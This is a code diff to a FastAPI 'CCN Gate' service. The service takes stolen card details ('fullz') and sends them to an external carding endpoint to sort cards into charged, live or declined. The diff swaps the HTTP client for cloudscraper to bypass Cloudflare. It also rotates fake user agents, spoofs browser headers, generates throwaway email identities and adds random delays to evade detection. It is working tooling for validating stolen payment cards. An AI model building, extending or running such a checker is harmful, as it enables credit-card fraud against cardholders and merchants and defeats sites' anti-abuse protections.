@@ -8,7 +8,7 @@ from typing import List, Optional
 from fastapi import FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
-import httpx
+import cloudscraper
 from fake_useragent import UserAgent
 import traceback
 
@@ -36,7 +36,7 @@ class CCResponse(BaseModel):
     card: str
     status: str
     message: str
-    proxy_used: Optional[str] = None  # kept for compatibility; will be None now
+    proxy_used: Optional[str] = None
 
 # ---------------------------
 # Helpers
@@ -53,28 +53,43 @@ def gets(s, start, end):
     except ValueError:
         return None
 
-# you can replace users with any static UA or use fake_useragent below to rotate
 DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
 
 async def get_session():
     """
-    Create an httpx AsyncClient WITHOUT proxying.
-    Returns: httpx.AsyncClient
+    Create a cloudscraper session that bypasses Cloudflare.
+    Returns: cloudscraper.CloudScraper
     """
-    client = httpx.AsyncClient(
-        timeout=httpx.Timeout(60.0),
-        trust_env=False,
-        follow_redirects=True,
+    try:
+        ua = UserAgent().random
+    except Exception:
+        ua = DEFAULT_UA
+    
+    scraper = cloudscraper.create_scraper(
+        browser={
+            'browser': 'chrome',
+            'platform': 'windows',
+            'mobile': False
+        },
+        delay=10
     )
-    return client
+    scraper.headers.update({
+        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "accept-language": "en-US,en;q=0.9",
+        "user-agent": ua,
+        "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not A(Brand)";v="99"',
+        "sec-ch-ua-platform": '"Windows"',
+        "referer": "https://google.com/",
+    })
+    return scraper
 
 # ---------------------------
 # Core Payment Function
 # ---------------------------
-async def create_payment_method(fullz: str, session: httpx.AsyncClient):
+async def create_payment_method(fullz: str, session):
     """
-    Always returns a CCResponse object (never None or raw string).
-    Does not use proxies. Uses rotating user-agents via fake_useragent.
+    Always returns a CCResponse object.
+    Uses cloudscraper to bypass Cloudflare protection.
     """
     proxy_used = None
     try:
@@ -82,23 +97,6 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient):
         user = "cristniki" + str(random.randint(9999, 574545))
         mail = f"{user}@gmail.com"
 
-        # rotate UA per request
-        try:
-            ua = UserAgent().random
-        except Exception:
-            ua = DEFAULT_UA
-
-        headers = {
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "accept-language": "en-US,en;q=0.9",
-            "user-agent": ua,
-            # optional headers that make the request more browser-like
-            "sec-ch-ua": '"Chromium";v="124", "Google Chrome";v="124", "Not A(Brand)";v="99"',
-            "sec-ch-ua-platform": '"Windows"',
-            "referer": "https://google.com/",
-        }
-
-        # Example target — replace with your target if needed.
         url = (
             f'https://ayanochk.vip/api/ppcpgatewayccn.php'
             f'?lista={fullz}'
@@ -106,16 +104,17 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient):
             f'&xlite=undefined'
         )
 
-        # make request
-        final = await session.get(url, headers=headers)
+        # Use cloudscraper to bypass CF
+        loop = asyncio.get_event_loop()
+        final = await loop.run_in_executor(None, lambda: session.get(url, timeout=60))
 
         response_text = final.text or ""
 
-        # debug log of raw response (goes to stdout / render logs)
+        # debug log
         print("🔹 API Raw Response (truncated 800 chars):")
         print(response_text[:800])
 
-        # interpret response_text
+        # interpret response
         if "DECLINED" in response_text:
             status, message = "declined", "Card Declined"
         elif "CCN CHARGED" in response_text:
@@ -123,7 +122,6 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient):
         elif "LIVE CCN" in response_text:
             status, message = "live", "Invalid CVV → CCN"
         else:
-            # include truncated response so you know what happened
             status, message = "error", f"Unexpected API Response: {response_text[:400]}"
 
         return CCResponse(
@@ -149,7 +147,7 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient):
 # ---------------------------
 @app.get("/")
 async def root():
-    return {"message": "CCN Gate API (no proxies) is running"}
+    return {"message": "CCN Gate API with CF Bypass is running"}
 
 @app.get("/ccngate/{cards}", response_model=List[CCResponse])
 async def check_cards_get(cards: str):
@@ -165,9 +163,8 @@ async def check_cards_get(cards: str):
             res = await create_payment_method(card.strip(), session)
             results.append(res)
         finally:
-            await session.aclose()
+            pass
 
-        # small delay between cards
         await asyncio.sleep(random.uniform(1.5, 3.5))
 
     return results
@@ -186,9 +183,8 @@ async def check_cards_post(request: CCRequest):
             res = await create_payment_method(card.strip(), session)
             results.append(res)
         finally:
-            await session.aclose()
+            pass
 
-        # small delay between cards
         await asyncio.sleep(random.uniform(1.5, 3.5))
 
     return results
